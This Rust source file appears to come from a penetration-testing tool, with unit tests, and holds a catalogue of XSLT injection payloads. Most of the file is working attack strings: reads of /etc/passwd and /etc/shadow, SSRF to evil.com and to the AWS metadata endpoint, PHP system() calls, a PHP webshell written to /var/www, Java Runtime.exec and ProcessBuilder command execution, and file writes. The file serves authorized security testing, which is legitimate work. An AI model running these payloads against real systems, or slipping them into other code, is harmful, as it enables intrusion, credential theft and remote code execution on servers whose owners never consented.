//! XSLT injection test payloads.
//!
//! ## Warning: For Authorized Security Testing Only
//!
//! These payloads are designed to test if target systems are vulnerable to XSLT injection
//! attacks. XSLT injection allows file read, SSRF, and RCE when an attacker can control
//! an XSL stylesheet or inject into an XSLT transformation pipeline.
//!
//! **Use only on systems you have explicit permission to test.** Unauthorized testing
//! against systems you do not own or have permission to test may be illegal.
//!
//! ## Payload Categories
//!
//! - Detection: XSLT processor fingerprinting
//! - File read: reading local files via `document()` or XXE
//! - SSRF: server-side requests via `document()`
//! - PHP RCE: PHP XSL extension function abuse
//! - Java RCE: Java XSLT processor Runtime/ProcessBuilder exec
//! - File write: writing files via EXSLT or XSLT 3.0

use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    payload_vec!(PayloadType::Xslt,
        "detection", [
            (r#"<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="system-property('xsl:vendor')"/></xsl:template></xsl:stylesheet>"#, "XSLT vendor detection", Severity::Medium),
            (r#"<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="system-property('xsl:version')"/></xsl:template></xsl:stylesheet>"#, "XSLT version detection", Severity::Medium),
            ("Version: <xsl:value-of select=\"system-property('xsl:version')\" />", "XSLT version output", Severity::Medium),
            ("Vendor: <xsl:value-of select=\"system-property('xsl:vendor')\" />", "XSLT vendor output", Severity::Medium),
        ];
        "file-read", [
            (r#"<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:copy-of select="document('/etc/passwd')"/></xsl:template></xsl:stylesheet>"#, "XSLT /etc/passwd read", Severity::Critical),
            (r#"<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:copy-of select="document('file:///c:/winnt/win.ini')"/></xsl:template></xsl:stylesheet>"#, "XSLT Windows file read", Severity::Critical),
            ("<xsl:copy-of select=\"document('/etc/shadow')\"/>", "XSLT shadow file read", Severity::Critical),
            ("<xsl:copy-of select=\"document('/proc/self/environ')\"/>", "XSLT process environment read", Severity::High),
            (r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><xsl:stylesheet><xsl:template match="/">&xxe;</xsl:template></xsl:stylesheet>"#, "XXE in XSLT document", Severity::Critical),
        ];
        "ssrf", [
            ("<xsl:copy-of select=\"document('http://evil.com/')\"/>", "XSLT SSRF to external host", Severity::High),
            ("<xsl:copy-of select=\"document('http://169.254.169.254/latest/meta-data/')\"/>", "XSLT AWS metadata SSRF", Severity::Critical),
            ("<xsl:copy-of select=\"document('http://127.0.0.1:6379/')\"/>", "XSLT Redis SSRF", Severity::High),
            ("<xsl:copy-of select=\"document('http://localhost:8080/')\"/>", "XSLT internal service SSRF", Severity::High),
        ];
        "php-rce", [
            (r#"<?xml version="1.0"?><xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0"><xsl:template match="/"><xsl:value-of select="php:function('readfile','index.php')"/></xsl:template></xsl:stylesheet>"#, "PHP XSL readfile", Severity::Critical),
            ("<xsl:value-of name=\"assert\" select=\"php:function('scandir', '.')\"/>", "PHP XSL scandir", Severity::High),
            ("<xsl:value-of select=\"php:function('file_put_contents','/var/www/shell.php','<?php system($_GET[c]); ?>')\"/>", "PHP XSL write webshell", Severity::Critical),
            ("<xsl:variable name=\"eval\" select=\"php:function('assert','system(\\\"id\\\")')\"/>", "PHP XSL assert RCE", Severity::Critical),
            ("<xsl:value-of select=\"php:function('system','id')\"/>", "PHP XSL system call", Severity::Critical),
        ];
        "java-rce", [
            ("<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\"><xsl:template match=\"/\"><xsl:variable name=\"rtobject\" select=\"rt:getRuntime()\"/><xsl:variable name=\"process\" select=\"rt:exec($rtobject,'id')\"/><xsl:value-of select=\"$process\"/></xsl:template></xsl:stylesheet>", "Java Runtime exec via Xalan", Severity::Critical),
            ("<xsl:value-of select=\"Runtime:exec(Runtime:getRuntime(),'cmd.exe /C whoami')\" xmlns:Runtime=\"java:java.lang.Runtime\"/>", "Java Saxon Runtime exec", Severity::Critical),
            ("<xsl:stylesheet version=\"2.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:java=\"http://saxon.sf.net/java-type\"><xsl:template match=\"/\"><xsl:value-of select=\"Runtime:exec(Runtime:getRuntime(),'id')\" xmlns:Runtime=\"java:java.lang.Runtime\"/></xsl:template></xsl:stylesheet>", "Saxon XSLT 2.0 RCE", Severity::Critical),
            ("<!-- Java ProcessBuilder RCE --><xsl:variable name=\"pb\" select=\"java:java.lang.ProcessBuilder.new(java:java.util.Arrays.asList('id'))\"/>", "Java ProcessBuilder RCE via XSLT", Severity::Critical),
        ];
        "file-write", [
            ("<xsl:stylesheet xmlns:exploit=\"http://exslt.org/common\" extension-element-prefixes=\"exploit\"><xsl:template match=\"/\"><exploit:document href=\"evil.txt\" method=\"text\">Injected</exploit:document></xsl:template></xsl:stylesheet>", "EXSLT file write", Severity::Critical),
            ("<xsl:value-of select=\"php:function('file_put_contents','evil.txt','injected')\"/>", "PHP XSL file write", Severity::Critical),
            ("<xsl:stylesheet><xsl:template match=\"/\"><xsl:variable name=\"content\" select=\"'injected'\"/><xsl:result-document href=\"evil.txt\" method=\"text\"><xsl:value-of select=\"$content\"/></xsl:result-document></xsl:template></xsl:stylesheet>", "XSLT 3.0 result-document file write", Severity::Critical),
        ]
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty(), "XSLT payloads must not be empty");
    }

    #[test]
    fn all_payloads_are_xslt_type() {
        for p in get_payloads() {
            assert_eq!(p.payload_type, PayloadType::Xslt);
        }
    }

    #[test]
    fn contains_file_read() {
        let payloads = get_payloads();
        let has_file_read = payloads
            .iter()
            .any(|p| p.tags.contains(&"file-read".to_string()));
        assert!(has_file_read, "Must contain file-read payloads");
    }

    #[test]
    fn contains_ssrf() {
        let payloads = get_payloads();
        let has_ssrf = payloads
            .iter()
            .any(|p| p.tags.contains(&"ssrf".to_string()));
        assert!(has_ssrf, "Must contain SSRF payloads");
    }

    #[test]
    fn contains_php_rce() {
        let payloads = get_payloads();
        let has_php = payloads
            .iter()
            .any(|p| p.tags.contains(&"php-rce".to_string()));
        assert!(has_php, "Must contain PHP RCE payloads");
    }

    #[test]
    fn contains_java_rce() {
        let payloads = get_payloads();
        let has_java = payloads
            .iter()
            .any(|p| p.tags.contains(&"java-rce".to_string()));
        assert!(has_java, "Must contain Java RCE payloads");
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 15,
            "Must have substantial XSLT payload coverage, got {}",
            payloads.len()
        );
    }
}
